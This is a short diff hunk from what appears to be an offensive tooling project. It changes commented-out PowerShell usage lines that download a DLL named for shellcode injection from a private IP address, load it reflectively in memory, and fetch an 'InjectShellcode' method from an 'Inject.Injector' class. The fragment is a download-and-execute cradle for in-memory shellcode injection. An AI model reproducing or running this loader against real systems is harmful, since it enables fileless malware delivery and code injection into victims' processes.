@@ -1,4 +1,4 @@
-// $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.145/dllhollow.dll')
+// $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.145/shellcodeInject.dll')
 // $assem = [System.Reflection.Assembly]::Load($data)
 // $class = $assem.GetType("Inject.Injector")
 // $method = $class.GetMethod("InjectShellcode")
